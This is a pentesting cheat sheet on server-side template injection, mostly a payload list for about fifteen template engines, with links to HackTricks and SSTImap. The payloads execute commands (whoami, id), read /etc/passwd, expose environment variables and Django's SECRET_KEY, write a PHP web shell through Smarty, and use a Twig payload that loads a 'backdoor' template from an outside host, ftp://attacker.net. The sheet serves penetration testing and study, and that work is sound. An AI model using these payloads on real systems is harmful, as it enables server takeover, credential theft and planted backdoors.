# Server-Side Template Injection

{% hint style="info" %}
**Server-side template injection** is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

At the **severe** end of the scale, an attacker can potentially achieve **remote code execution**, taking full control of the back-end server and using it to perform other attacks on internal infrastructure.

Even in cases where full remote code execution is not possible, an attacker can often still use **server-side template injection** as the **basis** for **numerous other attacks**, potentially **gaining read access to sensitive data** and arbitrary files on the server.
{% endhint %}

## Identification

![](<../../../.gitbook/assets/image (12).png>)

## Payloads

```
-------------------------------------------------------------------
Polyglot:
${{<%[%'"}}%\

-------------------------------------------------------------------
FreeMarker (Java):
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
--------------------------------------------------------------------
(Java):
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
--------------------------------------------------------------------
Twig (PHP):
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
--------------------------------------------------------------------
Smarty (PHP):
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-------------------------------------------------------------------
Handlebars (NodeJS):
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
-------------------------------------------------------------------
Velocity:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
-------------------------------------------------------------------
ERB (Ruby):
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
-------------------------------------------------------------------
Django Tricks (Python):
{% raw %}
{% debug %}
{{settings.SECRET_KEY}}
--------------------------------------------------------------------
Tornado (Python):
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
--------------------------------------------------------------------
Mojolicious (Perl):
<%= perl code %>
<% perl code %>
-------------------------------------------------------------------
Flask/Jinja2: Identify:
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{% endraw %}
-------------------------------------------------------------------
Flask/Jinja2: 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
--------------------------------------------------------------------
Jade:
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
--------------------------------------------------------------------
Razor (.Net):
@(1+2)
@{// C# code}
--------------------------------------------------------------------
ASP:
<%response.write(date())%>.
<% Response.Write("testing execution") %>
<%="testing execution" %>
```

### Jinja2

{% embed url="https://jinja.palletsprojects.com/en/2.11.x/api#jinja2.Environment" %}
Syntax
{% endembed %}

### Exploitation

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" %}
HackTrickz - SSTI
{% endembed %}

#### SSTI Map

{% embed url="https://github.com/vladko312/SSTImap" %}
